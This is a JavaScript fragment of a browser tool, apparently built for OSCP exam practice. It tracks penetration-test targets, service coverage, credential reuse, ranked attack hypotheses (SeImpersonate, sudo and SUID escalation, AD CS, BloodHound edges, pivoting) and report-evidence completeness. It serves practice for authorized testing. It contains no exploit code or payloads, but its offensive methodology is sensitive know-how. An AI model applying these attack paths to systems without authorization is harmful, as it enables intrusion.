function renderOperatorSelectors(){const opts=targets.map(t=>`<option value="${esc(t.id)}">${esc(targetLabel(t))}</option>`).join('');const s=$('#operatorTarget');if(s){s.innerHTML=opts||'<option>No targets</option>';s.value=activeTargetId||''}}
$('#operatorTarget').onchange=e=>{setActiveTarget(e.target.value);renderOperator()};$('#operatorOpenWorkspace').onclick=()=>switchView('workspaceView');$('#openOperator').onclick=()=>{switchView('operatorView');renderOperator()};$('#coverageOpenOperator').onclick=()=>{switchView('operatorView');renderOperator()};$('#saveExpertPrefs').onclick=()=>{expertPrefs={rotation:+$('#expertRotation').value||30,break:+$('#expertBreak').value||120};safeStoreSet(STORE+'expertPrefs',JSON.stringify(expertPrefs));renderOperator();toast('Expert preferences saved')};

function renderCoverage(){
 const t=activeTarget(),body=$('#coverageBody'),sum=$('#coverageSummary');renderCoverageSelectors();if(!t||!body)return;const st=coverageStats(t),instances=serviceInstances(t);sum.innerHTML=`<div class="row" style="justify-content:space-between"><div><div class="coverageScore">${st.pct}%</div><div class="muted">minimum service coverage (${st.done}/${st.total||0})</div></div><div style="min-width:260px"><div class="coverageBar"><div style="width:${st.pct}%"></div></div><div class="tiny" style="margin-top:5px">Auto-detected from Command Journal + manual checkmarks. This measures methodology coverage, not exploitation success.</div></div></div>`;
 body.innerHTML=instances.length?instances.map(([n,pb,ports])=>{const rows=checkCoverage(t,n,pb),builder=V8_CMD_SERVICES.includes(n);return`<div class="coverageHost"><div class="row" style="justify-content:space-between"><div><b>${esc(n)}</b> · ${esc(ports.map(p=>`${p.port}/${p.proto}`).join(', '))}</div><div class="row">${builder?`<button class="btn covBuild" data-svc="${esc(n)}" data-tid="${esc(t.id)}">Build commands</button>`:''}<button class="btn covTag" data-tag="${esc(pb.tag)}">${esc(pb.tag)}</button></div></div><div class="coverageService">${rows.map(r=>`<label class="coverageItem ${r.auto?'auto':''}"><input class="covCheck" data-svc="${esc(n)}" data-ck="${esc(r.id)}" type="checkbox" ${r.done?'checked':''} ${r.auto?'disabled':''}><span>${esc(r.label)}${r.auto?' <span class="tiny">(journal detected)</span>':''}</span><span class="${r.done?'coverageDone':'coverageMiss'}">${r.done?'DONE':'MISSING'}</span></label>`).join('')}</div></div>`}).join(''):'<div class="card muted">No imported open services yet. Import Nmap XML/normal output first or add the service manually.</div>';
 $$('.covCheck').forEach(x=>x.onchange=()=>{t.coverage=t.coverage||{};t.coverage[x.dataset.svc]=t.coverage[x.dataset.svc]||{};t.coverage[x.dataset.svc][x.dataset.ck]=x.checked;saveTargets();renderCoverage();renderOperator()});$$('.covBuild').forEach(b=>b.onclick=()=>openCommandBuilderFor(b.dataset.tid,'',b.dataset.svc));$$('.covTag').forEach(b=>b.onclick=()=>{$('#globalSearch').value=b.dataset.tag;switchView('searchView');renderSearch(b.dataset.tag)});
}
function renderCoverageSelectors(){const opts=targets.map(t=>`<option value="${esc(t.id)}">${esc(targetLabel(t))}</option>`).join('');const s=$('#coverageTarget');if(s){s.innerHTML=opts||'<option>No targets</option>';s.value=activeTargetId||''}}
$('#coverageTarget').onchange=e=>{setActiveTarget(e.target.value);renderCoverage()};

function renderDebt(){
 const debts=credentialDebts(),body=$('#debtBody'),stats=$('#debtStats');if(!body)return;stats.innerHTML=`<div class="journalStat"><b>${debts.length}</b><br><span class="tiny">untested combinations</span></div><div class="journalStat"><b>${debts.filter(d=>d.p===1).length}</b><br><span class="tiny">high priority</span></div><div class="journalStat"><b>${new Set(debts.map(d=>d.c.id)).size}</b><br><span class="tiny">credentials with debt</span></div>`;
 body.innerHTML=debts.length?debts.map(d=>`<tr><td class="${d.p===1?'debtHigh':'debtWarn'}">P${d.p}</td><td><b>${esc(d.c.user)}</b><div class="tiny">${esc(d.c.type)} · ${esc(d.c.scope)}</div></td><td>${esc(targetLabel(d.t))}</td><td>${esc(d.s)}</td><td>${esc(d.why)}</td><td><div class="row">${V8_CMD_SERVICES.includes(d.s)?`<button class="btn debtBuild" data-tid="${esc(d.t.id)}" data-cid="${esc(d.c.id)}" data-svc="${esc(d.s)}">Build</button>`:''}<button class="btn debtGo" data-tid="${esc(d.t.id)}">Matrix</button></div></td></tr>`).join(''):'<tr><td colspan="6" class="muted">No relevant untested credential/service combinations detected.</td></tr>';$$('.debtBuild').forEach(b=>b.onclick=()=>openCommandBuilderFor(b.dataset.tid,b.dataset.cid,b.dataset.svc));$$('.debtGo').forEach(b=>b.onclick=()=>{setActiveTarget(b.dataset.tid);switchView('credentialsView');renderCredentialMatrix()});
}
$('#debtOpenMatrix').onclick=()=>switchView('credentialsView');

function workspaceExpertHTML(t){const st=coverageStats(t),q=attentionQueue(t),closure=closureItems(t);return`<div class="row" style="justify-content:space-between"><div><b>Coverage ${st.pct}%</b> · ${q.length} attention item(s) · ${credentialDebts().filter(d=>d.t.id===t.id).length} credential debt</div><button class="btn" id="wsOpenExpert">Expert Operator →</button></div><div class="tiny" style="margin-top:6px">${closure.some(x=>!x.ok)?'Closure/evidence incomplete.':'No closure blocker currently active.'}</div>`}
const v11WorkspaceBase=renderWorkspace;renderWorkspace=function(){v11WorkspaceBase();const t=activeTarget(),r=$('#workspaceExpertBar');if(t&&r){r.innerHTML=workspaceExpertHTML(t);$('#wsOpenExpert').onclick=()=>{switchView('operatorView');renderOperator()}}};
function renderCockpitAttention(){const r=$('#cockpitAttention'),t=activeTarget();if(!r)return;const q=attentionQueue(t).slice(0,5);r.innerHTML=q.length?q.map(x=>`<div><b>P${x.p}</b> ${esc(x.title)}</div>`).join(''):'No queued actions for active target.'}
const v11ActiveBase=renderActiveSummary;renderActiveSummary=function(){v11ActiveBase();renderCockpitAttention()};

/* Session backup includes expert preferences and coverage already lives in targets. */
const v11SessionBase=sessionPayload;sessionPayload=function(includeSecrets=false){const o=v11SessionBase(includeSecrets);o.app='OSCP-V13';o.version=11;o.expertPrefs=expertPrefs;return o};
const v11RestoreBase=restoreV9Payload;restoreV9Payload=function(o){if(o?.expertPrefs)expertPrefs=o.expertPrefs;v11RestoreBase(o);targets=targets.map(upgradeV11Target);safeStoreSet(STORE+'expertPrefs',JSON.stringify(expertPrefs));renderAllV11()};

function renderAllV11(){renderAllV10();renderOperatorSelectors();renderOperator();renderCoverageSelectors();renderCoverage();renderDebt();renderCockpitAttention()}
const v11Switch=switchView;switchView=function(id){v11Switch(id);if(id==='operatorView')renderOperator();if(id==='coverageView')renderCoverage();if(id==='debtView')renderDebt()};

renderAllV11();

renderAllV10();

/* ===== V12 Exam Closer: hypotheses / correlation / consistency ===== */
function upgradeV12Target(t){
 t=upgradeV11Target(t);
 t.hypothesisState=plainRecord(t.hypothesisState)?t.hypothesisState:{};
 const allowed=new Set(['queued','validating','proven','killed','parked']);for(const [k,v] of Object.entries(t.hypothesisState)){if(!allowed.has(v))delete t.hypothesisState[k]}
 return t;
}
targets=targets.map(upgradeV12Target);
const v12NewTargetBase=newTarget;
newTarget=function(){return upgradeV12Target(v12NewTargetBase())};

/* Migrate V11 on first V12 launch. */
if(!targets.length){
 try{
  const oldTargets=JSON.parse(localStorage.getItem('oscp_v11_targets')||'[]');
  if(Array.isArray(oldTargets)&&oldTargets.length){
   targets=oldTargets.map(upgradeV12Target);
   const names=['credentials','favorites','preflight','boardConfig','evidenceVault','guardConfig','expertPrefs'];
   for(const n of names){try{const v=JSON.parse(localStorage.getItem('oscp_v11_'+n)||'null');if(v!==null){if(n==='credentials')credentials=v;else if(n==='favorites')favorites=v;else if(n==='preflight')preflightData=v;else if(n==='boardConfig')boardConfig=v;else if(n==='evidenceVault')evidenceVault=v;else if(n==='guardConfig')guardConfig=v;else if(n==='expertPrefs')expertPrefs=v}}catch(e){}}
   const oldActive=localStorage.getItem('oscp_v11_activeTarget');activeTargetId=oldActive&&targets.some(t=>t.id===oldActive)?oldActive:targets[0].id;
   if(!Array.isArray(credentials))credentials=[];if(!Array.isArray(favorites))favorites=[];if(!Array.isArray(evidenceVault))evidenceVault=[];
   if(preflightData!==null&&(!preflightData||typeof preflightData!=='object'||Array.isArray(preflightData)))preflightData=null;
   if(!boardConfig||typeof boardConfig!=='object'||Array.isArray(boardConfig))boardConfig={passTarget:70};
   if(!guardConfig||typeof guardConfig!=='object'||Array.isArray(guardConfig))guardConfig={entries:[],requireScope:true,checkPlaceholders:true,lhost:'',msfTargetId:''};
   if(!expertPrefs||typeof expertPrefs!=='object'||Array.isArray(expertPrefs))expertPrefs={rotation:30,break:120};
   targets.forEach(t=>{if(t.creds)sessionSecrets[t.id]=t.creds;if(!persistSecrets)t.creds=''});
   credentials.forEach(c=>{if(c.secret)sessionCredentialSecrets[c.id]=c.secret;if(!persistSecrets)c.secret=''});
   safeStoreSet(STORE+'targets',JSON.stringify(targets));safeStoreSet(STORE+'credentials',JSON.stringify(credentials.map(c=>({...c,secret:''}))));safeStoreSet(STORE+'favorites',JSON.stringify(favorites));safeStoreSet(STORE+'boardConfig',JSON.stringify(boardConfig));safeStoreSet(STORE+'evidenceVault',JSON.stringify(evidenceVault));safeStoreSet(STORE+'guardConfig',JSON.stringify(guardConfig));safeStoreSet(STORE+'expertPrefs',JSON.stringify(expertPrefs));safeStoreSet(STORE+'activeTarget',activeTargetId);
   toast('Legacy expert state migrated');
  }
 }catch(e){}
}

function portSet(t){return new Set((t?.ports||[]).filter(p=>p.state!=='closed').map(p=>+p.port))}
function coverageMissingLabels(t,name){
 const r=coverageForService(t,name);return r?r.missing.map(x=>x.label):[];
}
function successfulCredsFor(t,svc){
 return credentials.filter(c=>['valid','admin'].includes(c.checks?.[t.id+'|'+svc]));
}
function hypothesisTemplates(t){
 if(!t)return[];
 const ps=portSet(t),out=[],add=(id,rank,title,evidence,prereqs,kill,next,tag)=>out.push({id,rank,title,evidence,prereqs,kill,next,tag});
 const web=[80,443,8000,8080,8443].some(p=>ps.has(p));
 if(web){
  const miss=uncoveredServices(t).find(x=>x.name==='WEB')?.missing.map(x=>x.label)||[];
  add('web-foothold',2,'Web application → foothold',
      [`Web service exposed${t.host?' as '+t.host:''}`, ...(hasSignal(t,'creds')?['Credential material exists']:[])],
      miss.length?miss:['Identify a concrete vulnerable input/auth/upload/config path'],
      'Minimum web coverage complete and no evidence-producing clue remains.',
      miss[0]||'Validate the single strongest web clue; avoid parallel random fuzzing.',
      '[WEB:ENUM]');
 }
 if(ps.has(445)){
  const valid=successfulCredsFor(t,'SMB'),admin=valid.filter(c=>c.checks[t.id+'|SMB']==='admin');
  if(valid.length||hasSignal(t,'creds'))add('smb-access',admin.length?1:2,'SMB credential → useful authorization / lateral access',
      [valid.length?`${valid.length} credential(s) already valid on SMB`:'Credential material exists', ...(admin.length?['Admin-capable SMB state recorded']:[])],
      admin.length?['Choose the least disruptive reproducible admin access path']:['Test credential × SMB and enumerate shares/admin authorization'],
      'Credentials fail or authenticate without useful authorization and no share/file/session evidence exists.',
      admin.length?'Bank/admin-path evidence or re-enumerate with the new identity.':'Validate credential on SMB now.',
      '[CREDS:FANOUT]');
 }
 if(ps.has(5985)||ps.has(5986)){
  const v=successfulCredsFor(t,'WINRM');if(v.length||hasSignal(t,'creds'))add('winrm-shell',v.length?1:2,'Credential → stable WinRM shell',
    [v.length?`${v.length} credential(s) validated for WinRM`:'WinRM exposed + credential available'],
    v.length?['Establish stable shell and immediately run Windows first-90-seconds']:['Validate remote-management authorization'],
    'Known credentials are valid elsewhere but WinRM authorization consistently fails.',
    v.length?'Obtain shell → local evidence → Windows privesc tree.':'Test credential on WinRM.',
    '[PORT:5985]');
 }
 if(ps.has(22)){
  const v=successfulCredsFor(t,'SSH');if(v.length||hasSignal(t,'creds'))add('ssh-shell',v.length?1:2,'Credential/key → SSH shell',
    [v.length?`${v.length} credential(s) validated for SSH`:'SSH exposed + credential material exists'],
    v.length?['Stable shell + local evidence + Linux first-90-seconds']:['Validate password/key/user against SSH'],
    'All plausible credential/key candidates are disproven.',
    v.length?'Obtain shell and re-enumerate locally.':'Test the best credential/key against SSH.',
    '[PORT:22]');
 }
 if(hasSignal(t,'seimp'))add('seimp',1,'SeImpersonate → SYSTEM',
    ['SeImpersonate/SeAssignPrimaryToken signal is marked'],
    ['Exact Windows build/context','Compatible service/RPC primitive','A harmless identity validation step'],
    'Privilege is not enabled in the actual shell or no compatible primitive exists for the confirmed environment.',
    'Confirm build + service context before choosing one compatible technique.',
    '[WIN:SEIMPERSONATE]');
 if(hasSignal(t,'sudo'))add('sudo',1,'sudo rule → root',
    ['sudo clue is marked'],
    ['Exact sudo rule','Allowed arguments/environment','Controllable behavior/dependency'],
    'Allowed command has no controllable execution/read/write primitive under its sudo context.',
    'Inspect exact sudo rule and prove one controllable primitive.',
    '[LINUX:SUDO]');
 if(hasSignal(t,'suid'))add('suid',1,'Custom/unusual SUID → privileged dependency control',
    ['SUID/custom-binary clue is marked'],
    ['Identify privileged execution behavior','Find controllable PATH/library/config/temp/input','Trigger'],
    'Tracing shows no attacker-controlled dependency or the binary drops effective privilege before controlled behavior.',
    'file → strings → ldd/readelf → strace/ltrace; name the exact controlled dependency.',
    '[LINUX:SUID]');
 if(hasSignal(t,'systemd'))add('scheduled',1,'Cron/systemd → root execution',
    ['root scheduled/service clue is marked'],
    ['Privileged actor','Writable executed dependency or config','Known trigger/timing'],
    'Privileged unit/job is not writable indirectly or cannot be triggered/naturally reached.',
    'Identify the exact root-executed file/config and prove write + trigger.',
    '[LINUX:SYSTEMD]');
 if(hasSignal(t,'bloodhound'))add('bh-edge',1,'BloodHound edge → controlled AD object/action',
    ['BloodHound edge is marked'],
    ['Exact source principal','Exact target object','Permission semantics','Reachable/authenticated execution path'],
    'Manual ACL/permission validation disproves the graph edge or the required action cannot be exercised.',
    'Validate the exact edge manually before changing any object.',
    '[AD:ACL]');
 if(hasSignal(t,'adcs'))add('adcs',1,'AD CS configuration → privilege path',
    ['AD CS clue is marked'],
    ['Enabled template/CA','Effective enrollment/control rights','Required EKU/mapping/config','Authentication outcome'],
    'Template/CA configuration or effective rights do not satisfy the specific path prerequisites.',
    'Run targeted Certipy enumeration and prove one exact vulnerable path before requesting/changing anything.',
    '[AD:ADCS]');
 if(hasSignal(t,'internal'))add('pivot',1,'Internal route → new attack surface',
    ['Internal subnet/service signal is marked'],
    ['Pivot host can reach subnet','Tunnel/session active','Correct route','Target service reachable through route'],
    'Pivot host itself cannot reach the destination or the route is not actually present.',
    'Prove reachability from pivot → route/tunnel → one internal host; then enumerate it as fresh.',
    '[PIVOT:FLOW]');
 return out.sort((a,b)=>a.rank-b.rank);
}
function hypothesisState(t,id){return t.hypothesisState?.[id]||'queued'}
function renderHypSelectors(){
 const opts=targets.map(t=>`<option value="${esc(t.id)}">${esc(targetLabel(t))}</option>`).join('');
 const s=$('#hypTarget');if(s){s.innerHTML=opts||'<option value="">No targets</option>';s.value=activeTargetId||targets[0]?.id||''}
}
function hypBadge(st){return `<span class="hypStatus h-${st}">${esc(st.toUpperCase())}</span>`}
function renderHypotheses(){
 renderHypSelectors();const t=activeTarget(),root=$('#hypothesisBody');if(!root)return;
 const hyps=hypothesisTemplates(t);
 root.innerHTML=hyps.length?hyps.map(h=>{const st=hypothesisState(t,h.id);return `<div class="hypCard rank${h.rank}"><div class="row" style="justify-content:space-between"><div><div class="hypTitle">${esc(h.title)}</div><div class="hypMeta">rank ${h.rank} · ${esc(h.tag)}</div></div>${hypBadge(st)}</div><div class="hypList"><b>Evidence for:</b><br>${h.evidence.map(x=>'• '+esc(x)).join('<br>')}</div><div class="hypList"><b>Must prove:</b><br>${h.prereqs.map(x=>'□ '+esc(x)).join('<br>')}</div><div class="hypList"><b>Kill condition:</b><br>${esc(h.kill)}</div><div class="hypList"><b>Next validation:</b><br>${esc(h.next)}</div><div class="row"><select class="hypStateSelect" data-hid="${h.id}"><option value="queued">queued</option><option value="validating">validating</option><option value="proven">proven</option><option value="killed">killed</option><option value="parked">parked</option></select><button class="btn hypOpenTag" data-tag="${esc(h.tag)}">Open reference</button></div></div>`}).join(''):'<div class="card muted">No strong deterministic hypothesis generated from current state. Finish service coverage or mark concrete findings/signals.</div>';
 $$('.hypStateSelect').forEach(s=>{s.value=hypothesisState(t,s.dataset.hid);s.onchange=()=>{t.hypothesisState[s.dataset.hid]=s.value;logEvent(t,'hypothesis',`${s.dataset.hid} → ${s.value}`);saveTargets();renderHypotheses();renderOperator()}});
 $$('.hypOpenTag').forEach(b=>b.onclick=()=>{$('#globalSearch').value=b.dataset.tag;switchView('searchView');renderSearch(b.dataset.tag)});
}
$('#hypTarget').onchange=e=>{setActiveTarget(e.target.value);renderHypotheses()};
$('#refreshHypotheses').onclick=renderHypotheses;
$('#hypOpenOperator').onclick=()=>switchView('operatorView');

/* Correlation */
function subnet24(ip){const a=parseIPv4(ip);return a?`${a[0]}.${a[1]}.${a[2]}.0/24`:''}
function correlationData(){
 const sharedProducts=[],prodMap=new Map();
 targets.forEach(t=>(t.ports||[]).forEach(p=>{const key=[p.service,p.product,p.version].filter(Boolean).join(' ').trim();if(!key)return;const arr=prodMap.get(key)||[];arr.push({t,p});prodMap.set(key,arr)}));
 for(const [k,arr] of prodMap)if(arr.length>1)sharedProducts.push({k,arr});
 const subMap=new Map();targets.forEach(t=>{const s=subnet24(t.ip);if(s){const a=subMap.get(s)||[];a.push(t);subMap.set(s,a)}});const subnets=[...subMap].filter(([s,a])=>a.length>1);
 const credReuse=[];
 credentials.forEach(c=>{const hits=[];targets.forEach(t=>V7_SERVICES.forEach(s=>{const st=c.checks?.[t.id+'|'+s];if(st==='valid'||st==='admin')hits.push({t,s,st})}));if(hits.length>1)credReuse.push({c,hits})});
 const userMap=new Map();credentials.forEach(c=>{const u=(c.user||'').toLowerCase();if(!u)return;const a=userMap.get(u)||[];a.push(c);userMap.set(u,a)});const repeatedUsers=[...userMap].filter(([u,a])=>a.length>1);
 return {sharedProducts,subnets,credReuse,repeatedUsers};
}
function renderCorrelation(){
 const d=correlationData(),stats=$('#correlationStats'),root=$('#correlationBody');if(!stats||!root)return;
 stats.innerHTML=`<div><b>${d.credReuse.length}</b><br><span class="tiny">credential reuse patterns</span></div><div><b>${d.sharedProducts.length}</b><br><span class="tiny">shared products/versions</span></div><div><b>${d.subnets.length}</b><br><span class="tiny">multi-target /24s</span></div><div><b>${d.repeatedUsers.length}</b><br><span class="tiny">repeated usernames</span></div>`;
 const blocks=[];
 blocks.push(`<div class="corrCard"><h2>Credentials working in multiple places</h2>${d.credReuse.length?d.credReuse.map(x=>`<div class="corrItem hot"><b>${esc(x.c.user)}</b><br>${x.hits.map(h=>`${esc(targetLabel(h.t))} → ${h.s} (${h.st})`).join('<br>')}</div>`).join(''):'<div class="muted">No multi-target validated credential reuse yet.</div>'}</div>`);
 blocks.push(`<div class="corrCard"><h2>Same product/version across targets</h2>${d.sharedProducts.length?d.sharedProducts.slice(0,30).map(x=>`<div class="corrItem"><b>${esc(x.k)}</b><br>${x.arr.map(y=>`${esc(targetLabel(y.t))}:${esc(y.p.port)}/${esc(y.p.proto)}`).join(' · ')}</div>`).join(''):'<div class="muted">No repeated identified product/version yet.</div>'}</div>`);
 blocks.push(`<div class="corrCard"><h2>Subnet clusters</h2>${d.subnets.length?d.subnets.map(([s,a])=>`<div class="corrItem"><b>${esc(s)}</b><br>${a.map(t=>esc(targetLabel(t))).join(' · ')}</div>`).join(''):'<div class="muted">No multi-target /24 cluster yet.</div>'}</div>`);
 blocks.push(`<div class="corrCard"><h2>Repeated usernames / multiple secrets</h2>${d.repeatedUsers.length?d.repeatedUsers.map(([u,a])=>`<div class="corrItem warn"><b>${esc(u)}</b><br>${a.length} credential records · scopes: ${[...new Set(a.map(c=>c.scope))].join(', ')}</div>`).join(''):'<div class="muted">No repeated username records yet.</div>'}</div>`);
 root.innerHTML=blocks.join('');
}
$('#corrOpenDebt').onclick=()=>switchView('debtView');

/* Consistency / bankability */
function explicitKnownOtherIPs(text,t){
 const known=new Set(targets.filter(x=>x.id!==t.id).map(x=>x.ip).filter(Boolean)),found=[];
 for(const m of String(text||'').matchAll(/\b(?:\d{1,3}\.){3}\d{1,3}\b/g))if(known.has(m[0]))found.push(m[0]);
 return [...new Set(found)];
}
function reportCorpus(t){
 return [t.report?.title,t.report?.foothold,t.report?.privesc,t.report?.commands,t.report?.screens,t.report?.remediation,(t.journal||[]).map(j=>j.command+' '+(j.note||'')).join('\n')].filter(Boolean).join('\n');
}
function consistencyAudit(t){
 const a=[],add=(p,title,why)=>a.push({p,title,why});
 if(!t)return a;
 const corpus=reportCorpus(t),other=explicitKnownOtherIPs(corpus,t),closure=closureItems(t),missingClosure=closure.filter(x=>!x.ok);
 if((+t.pointsAwarded||0)>0&&missingClosure.length)add(0,'Awarded points are not fully banked',`${t.pointsAwarded} point(s) are recorded, but closure still misses: ${missingClosure.slice(0,5).map(x=>x.l).join('; ')}`);
 if(t.stage==='complete'&&missingClosure.length)add(0,'Target is marked complete with missing closure evidence',missingClosure.map(x=>x.l).join('; '));
 if(other.length)add(0,'Report/journal contains another known target IP',`Found ${other.join(', ')} while auditing ${t.ip||targetLabel(t)}. Verify this is intentional pivot context, not copied evidence.`);
 if(!t.ip)add(0,'Target IP is missing','A report/evidence packet without a canonical target IP is easy to mix up.');
 if(!t.report?.title)add(1,'Report title/finding is empty','Name the foothold/vulnerability clearly before export.');
 if(!t.report?.commands)add(1,'Reproduction command section is empty','Do not rely only on the journal; preserve the minimal reproducible chain in the report.');
 const placeholders=(corpus.match(/\b(?:TODO|TARGET|LHOST|LPORT|RHOST|PASSWORD|USERNAME|DC_IP)\b|<[^>\n]+>|\$[A-Z_]+/g)||[]);
 if(placeholders.length)add(1,'Unresolved placeholder/TODO remains in report material',[...new Set(placeholders)].slice(0,12).join(', '));
 const proofItems=evidenceVault.filter(e=>e.targetId===t.id&&(e.kind==='proof'||e.kind==='local-proof'));
 if((t.status.local||t.status.foothold)&&!proofItems.some(e=>e.kind==='local-proof'))add(1,'No local-proof file registered in Evidence Vault','Register/hash the local evidence file/screenshot so the manifest matches the closure state.');
 if((t.status.privesc||t.status.proof)&&!proofItems.some(e=>e.kind==='proof'))add(0,'No proof-class evidence file registered','Root/SYSTEM is recorded but Evidence Vault has no proof-class entry.');
 if(proofItems.some(e=>!e.ipVisible))add(1,'Proof-class evidence has unconfirmed target IP visibility','Evidence Vault contains proof/local-proof entries where IP-visible is not confirmed.');
 if(proofItems.some(e=>!e.proofVisible))add(1,'Proof-class evidence has unconfirmed proof visibility','Evidence Vault contains proof/local-proof entries where proof-visible is not confirmed.');
 if((t.journal||[]).length===0)add(2,'Command Journal is empty','Import transcript/history so reporting does not depend on memory.');
 const cov=coverageStats(t);if(cov.total&&cov.pct<60&&t.stage!=='complete')add(2,'Service coverage is still thin',`Minimum service coverage is ${cov.pct}%. This may be fine if a strong validated path exists; otherwise obvious enumeration may still be missing.`);
 if(!a.length)add(9,'No deterministic consistency problem detected','Still manually verify screenshots, flag submissions, control-panel state and the official reporting requirements.');
 return a.sort((x,y)=>x.p-y.p);
}
function bankability(t){
 if(!t)return 0;let score=100;const issues=consistencyAudit(t);issues.forEach(x=>{if(x.p===0)score-=25;else if(x.p===1)score-=12;else if(x.p===2)score-=5});return Math.max(0,score);
}
function pointsAtRisk(){
 const total=targets.reduce((n,t)=>n+(+t.pointsAwarded||0),0),atRisk=targets.filter(t=>(+t.pointsAwarded||0)>0&&closureItems(t).some(x=>!x.ok)).reduce((n,t)=>n+(+t.pointsAwarded||0),0),completeRisk=targets.filter(t=>t.stage==='complete'&&consistencyAudit(t).some(x=>x.p===0)).length,unbanked=targets.filter(t=>(t.status.foothold||t.status.privesc)&&closureItems(t).some(x=>!x.ok)).length;
 return {total,atRisk,completeRisk,unbanked};
}
function renderAuditSelectors(){const s=$('#auditTarget'),opts=targets.map(t=>`<option value="${esc(t.id)}">${esc(targetLabel(t))}</option>`).join('');if(s){s.innerHTML=opts||'<option value="">No targets</option>';s.value=activeTargetId||targets[0]?.id||''}}
function renderAudit(){
 renderAuditSelectors();const t=activeTarget(),root=$('#auditIssues');if(!t||!root)return;const issues=consistencyAudit(t),score=bankability(t),risk=pointsAtRisk();
 $('#auditScore').textContent=score+'%';$('#auditScoreText').textContent=score>=90?'Strong bankability. Manually verify submissions/screenshots once more.':score>=65?'Usable, but fix the high-priority inconsistencies before moving on.':'Do not count this target as safely banked yet.';
 $('#auditRiskSummary').innerHTML=`<div><b>${risk.total}</b><br><span class="tiny">awarded points recorded</span></div><div><b>${risk.atRisk}</b><br><span class="tiny">points with incomplete closure</span></div><div><b>${risk.unbanked}</b><br><span class="tiny">foothold/root targets not fully banked</span></div><div><b>${risk.completeRisk}</b><br><span class="tiny">complete targets with P0 inconsistency</span></div>`;
 root.innerHTML=issues.map(x=>`<div class="auditIssue ${x.p===9?'ok':'p'+x.p}"><b>${esc(x.title)}</b><div class="tiny">${esc(x.why)}</div></div>`).join('');
 $('#auditKnownTargets').innerHTML=targets.map(x=>`<button class="${x.id===t.id?'active':''}" data-at="${esc(x.id)}">${esc(targetLabel(x))}</button>`).join('');$$('#auditKnownTargets [data-at]').forEach(b=>b.onclick=()=>{setActiveTarget(b.dataset.at);renderAudit()});
}
$('#auditTarget').onchange=e=>{setActiveTarget(e.target.value);renderAudit()};
$('#auditOpenReport').onclick=()=>switchView('reportsView');

/* Operator enhancements */
function parkDecision(t){
 if(!t)return{go:false,title:'No target',why:'Add/select a target.'};
 const q=attentionQueue(t),p0=q.some(x=>x.p===0),high=(t.findings||[]).some(f=>f.confidence==='high')||hypothesisTemplates(t).some(h=>h.rank===1&&['queued','validating'].includes(hypothesisState(t,h.id)));
 const age=Math.floor((Date.now()-(t.lastActivity||Date.now()))/60000),rot=+expertPrefs.rotation||30;
 const exact=(t.next||[]).filter(Boolean).length>0;
 if(p0)return{go:false,title:'DO NOT PARK YET',why:'Bank evidence/points first. P0 closure work exists.'};
 if(high&&exact)return{go:false,title:'CONTINUE ONE VALIDATION',why:'A high-signal path exists and you have an explicit next action. Validate that prerequisite, then reassess.'};
 if(age>=rot&&!exact)return{go:true,title:'ROTATE / PARK',why:`No recorded state change for ${age} minutes and no explicit next action is written.`};
 if(!high&&uncoveredServices(t).length===0)return{go:true,title:'PARK IS REASONABLE',why:'No high-signal path remains and minimum imported-service coverage has no obvious gap.'};
 return{go:false,title:'CONTINUE METHODICALLY',why:'Either coverage debt or a concrete hypothesis remains. Work one evidence-producing action at a time.'};
}
function renderOperatorV12(){
 const t=activeTarget();if(!t)return;
 const hyps=hypothesisTemplates(t).filter(h=>!['killed','parked'].includes(hypothesisState(t,h.id))).slice(0,4);
 $('#operatorHypotheses').innerHTML=hyps.length?hyps.map(h=>`<div class="corrItem ${h.rank===1?'hot':''}"><b>${esc(h.title)}</b> ${hypBadge(hypothesisState(t,h.id))}<br><span class="tiny">Next: ${esc(h.next)}</span></div>`).join(''):'<span class="muted">No ranked hypothesis. Finish coverage or mark concrete evidence.</span>';
 const pd=parkDecision(t);$('#operatorParkGate').innerHTML=`<div class="${pd.go?'parkYes':'parkNo'}">${esc(pd.title)}</div><div class="tiny" style="margin-top:6px">${esc(pd.why)}</div>`;
 const r=pointsAtRisk();$('#operatorPointsRisk').innerHTML=`<div><b>${r.total}</b><br><span class="tiny">awarded</span></div><div><b>${r.atRisk}</b><br><span class="tiny">at risk</span></div><div><b>${r.unbanked}</b><br><span class="tiny">unbanked targets</span></div><div><b>${r.completeRisk}</b><br><span class="tiny">complete + P0 issue</span></div>`;
}
const v12OperatorBase=renderOperator;renderOperator=function(){v12OperatorBase();renderOperatorV12()};

/* Report audit summary */
function renderReportConsistency(){const root=$('#reportConsistencySummary'),t=activeTarget();if(!root||!t)return;const is=consistencyAudit(t),p0=is.filter(x=>x.p===0).length,p1=is.filter(x=>x.p===1).length;root.innerHTML=`Bankability <b>${bankability(t)}%</b> · P0: <b>${p0}</b> · P1: <b>${p1}</b> <button class="btn" id="openAuditFromReport">Open audit →</button>`;$('#openAuditFromReport').onclick=()=>switchView('auditView')}
const v12ReportBase=renderReport;renderReport=function(){v12ReportBase();renderReportConsistency()};

/* Session state */
const v12SessionBase=sessionPayload;sessionPayload=function(includeSecrets=false){const o=v12SessionBase(includeSecrets);o.app='OSCP-V13';o.version=12;return o};
const v12RestoreBase=restoreV9Payload;restoreV9Payload=function(o){v12RestoreBase(o);targets=targets.map(upgradeV12Target);renderAllV12()};

function renderAllV12(){renderAllV11();renderHypSelectors();renderHypotheses();renderCorrelation();renderAudit();renderOperatorV12();renderReportConsistency()}
const v12Switch=switchView;switchView=function(id){v12Switch(id);if(id==='hypothesisView')renderHypotheses();if(id==='correlationView')renderCorrelation();if(id==='auditView')renderAudit()};

renderAllV12();

renderAllV11();

/* ===== V13 Battle-Tested: sanity / regression / freshness ===== */
const V13_RULE_DEFAULT='2026-09-23';
const V13_TOOL_SNAPSHOTS=[
 {name:'NetExec / nxc',verified:'2026-09-16',tag:'[CREDS:FANOUT]',maxDays:90},
 {name:'BloodHound CE',verified:'2026-09-16',tag:'[AD:BLOODHOUND]',maxDays:90},
 {name:'Impacket Kali wrappers',verified:'2026-09-16',tag:'[AD:KERBEROS]',maxDays:90},
 {name:'Certipy command family',verified:'2026-09-16',tag:'[AD:ADCS]',maxDays:60},
 {name:'Ligolo-ng v0.9.1 managed syntax',verified:'2026-09-16',tag:'[PIVOT:LIGOLO]',maxDays:60}
];
let freshnessState=safeStoredRecord(STORE+'freshness',{rulesVerified:V13_RULE_DEFAULT});
let preExamState=safeStoredRecord(STORE+'preExam',{});
let regressionResults=[];

function upgradeV13Target(t){return upgradeV12Target(t)}
targets=targets.map(upgradeV13Target);

/* Prefer V12 state on first V13 launch. */
if(!targets.length){
 try{
  const ot=JSON.parse(localStorage.getItem('oscp_v12_targets')||'[]');
